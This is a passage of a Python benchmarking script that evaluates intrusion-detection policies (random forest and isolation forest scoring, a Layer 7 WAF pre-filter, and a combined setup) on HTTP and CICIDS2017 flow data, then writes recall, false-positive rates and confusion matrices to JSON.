        probas = predictor.rf.predict_proba(X)
        classes = predictor.rf.predict(X)
        max_ps = np.max(probas, axis=1)

        X_scaled = predictor.ifo.named_steps["scaler"].transform(X)
        if_scores = predictor.ifo.named_steps["if"].score_samples(X_scaled)

        slice_counts = {
            "config_a_prod": {"tp": 0, "fp": 0, "tn": 0, "fn": 0, "block_tp": 0, "block_fp": 0},
            "config_b_cand_flow": {"tp": 0, "fp": 0, "tn": 0, "fn": 0, "block_tp": 0, "block_fp": 0},
            "config_c_l7_alone": {"tp": 0, "fp": 0, "tn": 0, "fn": 0, "block_tp": 0, "block_fp": 0},
            "config_d_combined": {"tp": 0, "fp": 0, "tn": 0, "fn": 0, "block_tp": 0, "block_fp": 0},
        }

        for i in range(n_total):
            is_att = bool(y_is_attack[i])
            rec = records[i]
            cls_idx = int(classes[i])
            raw_cname = LABEL_NAMES.get(cls_idx, "BENIGN")
            max_p = float(max_ps[i])
            if_score = float(if_scores[i])
            is_anomaly = bool(if_score < ANOMALY_THRESHOLD)
            if_sig = predictor.calculate_if_anomaly_signal(if_score)

            # Config A
            rf_s = max_p if raw_cname != "BENIGN" else (1.0 - max_p)
            prod_s = round(0.7 * rf_s + 0.3 * if_sig, 4)
            prod_act = "BLOCK" if prod_s >= BLOCK_THRESHOLD else "MONITOR" if prod_s >= MONITOR_THRESHOLD else "ALLOW"
            prod_blk = (prod_act == "BLOCK")

            # Config B
            cand_dec = cand_policy.evaluate_signals(
                cname=raw_cname,
                confidence=max_p,
                is_anomaly=is_anomaly,
                anomaly_signal=if_sig,
                anomaly_score=if_score
            )
            cand_act = cand_dec["action"]
            cand_blk = (cand_act == "BLOCK")

            # Config C (L7 alone: since pure L4 flow has no HTTP body, L7 is UNAVAILABLE -> ALLOW)
            l7_act = "ALLOW"
            l7_blk = False

            # Config D (Combined: L7 is unavailable, so falls back seamlessly to Candidate Flow Policy)
            comb_act = cand_act
            comb_blk = cand_blk

            configs = {
                "config_a_prod": (prod_act in ("MONITOR", "BLOCK"), prod_blk),
                "config_b_cand_flow": (cand_act in ("MONITOR", "BLOCK"), cand_blk),
                "config_c_l7_alone": (l7_act in ("MONITOR", "BLOCK"), l7_blk),
                "config_d_combined": (comb_act in ("MONITOR", "BLOCK"), comb_blk),
            }

            for ckey, (is_pos, is_b) in configs.items():
                if is_att:
                    if is_pos: slice_counts[ckey]["tp"] += 1
                    else: slice_counts[ckey]["fn"] += 1
                    if is_b: slice_counts[ckey]["block_tp"] += 1
                else:
                    if is_pos: slice_counts[ckey]["fp"] += 1
                    else: slice_counts[ckey]["tn"] += 1
                    if is_b: slice_counts[ckey]["block_fp"] += 1

        corpus_results[skey] = {
            "total_flows": n_total,
            "attack_flows": int(np.sum(y_is_attack)),
            "benign_flows": int(np.sum(~y_is_attack)),
            "configs": slice_counts
        }

    print(f"\nCorpus evaluation completed on {total_corpus_flows} flows across 8 slices.")

    # -------------------------------------------------------------------------
    # PART 3: FORMAT & WRITE OUTPUT DELIVERABLES
    # -------------------------------------------------------------------------
    out_metrics = {
        "metadata": {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "benchmark_scope": "GATE-1 Phase 5 Multi-Configuration Evaluation",
            "evaluated_corpora": {
                "http_synthetic_benchmark": {"total_records": len(http_records)},
                "cicids2017_flow_corpus": {"total_flows": total_corpus_flows}
            },
            "configurations": {
                "config_a_prod": "Existing Production Policy (Coupled RF + IF)",
                "config_b_cand_flow": "Phase 4 Candidate Flow Policy (Decoupled RF + IF)",
                "config_c_l7_alone": "Layer 7 WAF Pre-Filter Alone",
                "config_d_combined": "Combined Layer 7 Pre-Filter + Candidate Flow Policy"
            }
        },
        "http_benchmark_metrics": {},
        "cicids2017_corpus_metrics": {}
    }

    # Format HTTP benchmark metrics
    for ckey, counts in results_http.items():
        tot_att = counts["tp"] + counts["fn"]
        tot_ben = counts["fp"] + counts["tn"]
        rec = counts["tp"] / tot_att if tot_att > 0 else 0.0
        fpr = counts["fp"] / tot_ben if tot_ben > 0 else 0.0
        blk_rec = counts["block_tp"] / tot_att if tot_att > 0 else 0.0
        blk_fpr = counts["block_fp"] / tot_ben if tot_ben > 0 else 0.0

        out_metrics["http_benchmark_metrics"][ckey] = {
            "containment_recall": round(rec, 5),
            "containment_recall_ci_95": list(wilson_score_interval(counts["tp"], tot_att)),
            "simulated_block_recall": round(blk_rec, 5),
            "simulated_block_recall_ci_95": list(wilson_score_interval(counts["block_tp"], tot_att)),
            "false_positive_rate": round(fpr, 5),
            "false_positive_rate_ci_95": list(wilson_score_interval(counts["fp"], tot_ben)),
            "simulated_block_fpr": round(blk_fpr, 5),
            "simulated_block_fpr_ci_95": list(wilson_score_interval(counts["block_fp"], tot_ben)),
            "confusion": counts
        }

    # Format CICIDS2017 corpus metrics
    for skey, sdata in corpus_results.items():
        out_metrics["cicids2017_corpus_metrics"][skey] = {
            "total_flows": sdata["total_flows"],
            "attack_flows": sdata["attack_flows"],
            "benign_flows": sdata["benign_flows"],
            "configs": {}
        }
        tot_att = sdata["attack_flows"]
        tot_ben = sdata["benign_flows"]

        for ckey, counts in sdata["configs"].items():
            rec = counts["tp"] / tot_att if tot_att > 0 else 0.0
            fpr = counts["fp"] / tot_ben if tot_ben > 0 else 0.0
            blk_rec = counts["block_tp"] / tot_att if tot_att > 0 else 0.0
            blk_fpr = counts["block_fp"] / tot_ben if tot_ben > 0 else 0.0

            out_metrics["cicids2017_corpus_metrics"][skey]["configs"][ckey] = {
                "containment_recall": round(rec, 5),
                "containment_recall_ci_95": list(wilson_score_interval(counts["tp"], tot_att)),
                "simulated_block_recall": round(blk_rec, 5),
                "simulated_block_recall_ci_95": list(wilson_score_interval(counts["block_tp"], tot_att)),
                "false_positive_rate": round(fpr, 5),
                "false_positive_rate_ci_95": list(wilson_score_interval(counts["fp"], tot_ben)),
                "simulated_block_fpr": round(blk_fpr, 5),
                "simulated_block_fpr_ci_95": list(wilson_score_interval(counts["block_fp"], tot_ben)),
                "confusion": counts
            }

    # Write policy_comparison_metrics.json
    out_metrics_file = CURRENT_DIR / "policy_comparison_metrics.json"
    with open(out_metrics_file, "w") as f:
        json.dump(out_metrics, f, indent=2)
    print(f"\n[OUTPUT] Saved policy comparison metrics to: {out_metrics_file}")

    # Write per_attack_confusion_matrices.json
    per_attack_out = {
        "metadata": {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "notice": "All block counts represent simulated policy decisions. Zero Windows Firewall rules were created."
        },
        "http_attack_categories": per_category_http,
        "flow_corpus_slices": {skey: sdata["configs"] for skey, sdata in corpus_results.items()}
    }

    out_cm_file = CURRENT_DIR / "per_attack_confusion_matrices.json"
    with open(out_cm_file, "w") as f:
        json.dump(per_attack_out, f, indent=2)
    print(f"[OUTPUT] Saved per-attack confusion matrices to: {out_cm_file}")


if __name__ == "__main__":
    run_benchmark()
